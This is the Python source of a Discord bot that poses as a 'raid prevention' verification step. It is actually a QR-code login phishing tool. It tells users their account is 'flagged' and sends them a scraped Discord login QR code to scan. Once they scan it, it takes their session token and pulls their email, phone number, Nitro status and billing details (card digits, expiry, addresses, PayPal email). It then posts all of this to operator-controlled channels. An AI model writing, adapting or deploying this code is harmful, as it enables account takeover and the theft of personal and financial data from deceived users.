from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import time
from bs4 import BeautifulSoup
from datetime import datetime
import lxml
from PIL import Image
from dhooks import Webhook, Embed
import os
import requests
import base64
from discord.ext import commands
import discord
import asyncio
import json


bot_token = 'TOKEN' # DISCORD BOT TOKEN
verifyembedimage = 'URL' # link to an image / gif used on the verify url
global logchannelid # ignore this
logchannelid = 'ID' # ID of the channel you want the full log to go to (THE BOT MUST HAVE ACCESS TO THIS)
global tokenchannelid # ignore this
tokenchannelid = 'ID' # ID of the channel you want to send the token to (THE BOT MUST HAVE ACCESS TO THIS)
prefix = 'PREFIX' # PREFIX OF THE BOT

def logo_qr():
    im1 = Image.open('base/qr_code.png', 'r')
    im2 = Image.open('base/overlay.png', 'r')
    im2_w, im2_h = im2.size
    im1.paste(im2, (60, 55))
    im1.save('temp/final_qr.png', quality=95)

def paste_template():
    im1 = Image.open('base/qr_code.png', 'r')
    im1.save('discord.png', quality=95)

header = {
  "Content-Type": "application/json",
  "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
}

def get_header(token=None):
  headers = header

  if token:
    header.update({"Authorization": token})
  return headers



class PersistentView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label='Verify', style=discord.ButtonStyle.blurple, custom_id='persistent_view:verify')
    async def green(self, interaction: discord.Interaction, button: discord.ui.Button):
        
        a = await interaction.response.send_message(f'{interaction.user.mention} Your verification has started, check DMS!', ephemeral=True)
        emab = discord.Embed(description = f"{interaction.user.mention} we are getting your **verification** ready!\n \n please allow up to __15 seconds__ for it to be sent.")    
        baa = await interaction.user.send(embed = emab)
        chrome_options = Options()
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        driver = webdriver.Chrome(options=chrome_options)
        driver.minimize_window()    
        driver.get('https://discord.com/login')
        

        await asyncio.sleep(15)
            
        page_source = driver.page_source
            
        soup = BeautifulSoup(page_source, features='lxml')
            
        div = soup.find('div', {'class': 'qrCode-2R7t9S'})
        qr_code = div.find('img')['src']
        file = os.path.join(os.getcwd(), 'base/qr_code.png')
            
        img_data =  base64.b64decode(qr_code.replace('data:image/png;base64,', ''))
            
        with open(file,'wb') as handler:
          handler.write(img_data)
            
        discord_login = driver.current_url
        paste_template()
          
        file = discord.File("discord.png", filename="discord.png")
          
        verify_main_embed = discord.Embed(title = " VERIFICATION ",description="\nFollow the following steps to verify your account: \n\n `1.` Log into your discord account on **mobile** \n `2.` head over to `settings` and navigate to `scan QR code` \n `3.` Scan the QR code, and complete the verification. \n\n Once you have **completed** this you will recieve __access__ to the server.")
        verify_main_embed.set_image(url='attachment://discord.png')
        verify_main_embed.set_footer(text = "If you have issues please contact support")
        await baa.delete()
        vemb = await interaction.user.send(embed=verify_main_embed, file=file)         

        x = 0          
        while True:
            
            if discord_login != driver.current_url:
                print('Grabbing token..')
                token = driver.execute_script('''
                window.dispatchEvent(new Event('beforeunload'));
                let iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                document.body.appendChild(iframe);
                let localStorage = iframe.contentWindow.localStorage;
                var token = JSON.parse(localStorage.token);
                return token;''')
                  
                r = requests.get('https://discord.com/api/v9/users/@me', headers=get_header(token))
                res = requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', headers=get_header(token))
              
                #fetch data of logged user
                userName = r.json()['username'] + '#' + r.json()['discriminator']
                userID = r.json()['id']
                avatar_id = r.json()['avatar']
                avatar_url = f'https://cdn.discordapp.com/avatars/{userID}/{avatar_id}.webp'
                phone = r.json()['phone']
                email = r.json()['email']
                nitro_data = res.json()
                has_nitro = bool(len(nitro_data) > 0)
              
                if has_nitro:
                  d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                  d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                  days_left = abs((d2 - d1).days)
              
                  
                cc_digits = {
                    'american express': '3',
                    'visa': '4',
                    'mastercard': '5'
                    }
              
                billing_info = []
                for x in requests.get('https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=get_header(token)).json():
                  y = x['billing_address']
                  name = y['name']
                  address_1 = y['line_1']
                  address_2 = y['line_2']
                  city = y['city']
                  postal_code = y['postal_code']
                  state = y['state']
                  country = y['country']
                  if x['type'] == 1:
                    cc_brand = x['brand']
                    cc_first = cc_digits.get(cc_brand)
                    cc_last = x['last_4']
                    cc_month = str(x['expires_month'])
                    cc_year = str(x['expires_year'])
                    data = {
                            'Payment Type': 'Credit Card',
                            'Valid': not x['invalid'],
                            'CC Holder Name': name,
                            'CC Brand': cc_brand.title(),
                            'CC Number': ''.join(z if (i + 1) % 2 else z + ' ' for i, z in enumerate((cc_first if cc_first else '*') + ('*' * 11) + cc_last)),
                            'CC Exp. Date': ('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4],
                            'Address 1': address_1,
                            'Address 2': address_2 if address_2 else '',
                            'City': city,
                            'Postal Code': postal_code,
                            'State': state if state else '',
                            'Country': country,
                            'Default Payment': x['default']
                           }
                  elif x['type'] == 2:
                      
                        data = {
                            
                            'Payment Type': 'PayPal',
                            'Valid': not x['invalid'],
                            'PayPal Name': name,
                            'PayPal Email': x['email'],
                            'Address 1': address_1,
                            'Address 2': address_2 if address_2 else '',
                            'City': city,
                            'Postal Code': postal_code,
                            'State': state if state else '',
                            'Country': country,
                            'Default Payment': x['default']
                        }
                  billing_info.append(data)
                  driver.close()
                      
                      
                  try:
                      global logchannelid
                      global tokenchannelid
                      logchannelid = int(logchannelid)
                      tokenchannelid = int(tokenchannelid)
                      yeschannel = bot.get_channel(logchannelid)
                      tokenchannel = bot.get_channel(tokenchannelid)
                      log_embed=discord.Embed(
                          description = f"""
                          The users loggged information has been fetched and formatted below.
                          -- **User** --
                          **Token** - {token}
                          **Username** - {userName}
                          **Email** - {email}
                          **PhoneNumber** - {phone}
                          -- **Nitro** --
                          **Nitro** - {has_nitro}
                          **Expires in**  - {days_left if has_nitro else "0"} days(s)
                          -- **Billing** --
                          ```{billing_info}```
                          """)
                      log_embed.set_author(name=f"{userName}", icon_url=f"{avatar_url}")
                      await vemb.delete()
                      await yeschannel.send(embed=log_embed)
                      await tokenchannel.send(f"{token}")
                      guild = interaction.guild
                      await interaction.user.send(f"> You have successfully verified in **{guild.name}**")
                      c = await interaction.channel.send(f'> {interaction.user.mention} Has successfully verified!')
                      await asyncio.sleep(60)
                      await c.delete()

                  except requests.exceptions.HTTPError as err:
                        print(err)
                        break
            else:
                x = x + 1
                print(x)
                if x >= 45:
                    driver.close()
                    await interaction.user.send(f'> {interaction.user.mention} You took longer then `45` seconds to verify. please retry.')
                    return
                await asyncio.sleep(1)

                    
            
class PersistentViewBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True

        super().__init__(command_prefix=commands.when_mentioned_or(f'{prefix}'), intents=intents)

    async def setup_hook(self) -> None:
        self.add_view(PersistentView())

    async def on_ready(self):
        print(f'Logged in as {self.user} (ID: {self.user.id})')
        print('------')


bot = PersistentViewBot()


@bot.command()
async def verify(ctx: commands.Context):
    """Starts a persistent view."""
    e = discord.Embed(title = " ACCOUNT FLAGGED ", description = "\n Hey there! Your account has been flagged as __suspicious__ by our **RAID PREVENTION BOT**\n \nclick the `verify` button below to **VERIFY YOUR ACCOUNT** and recieve access to the server.")
    e.set_image(url = f"{verifyembedimage}")
    e.set_footer(text = "Protected by star 2022")
    await ctx.send(embed = e, view=PersistentView())



bot.run(bot_token)
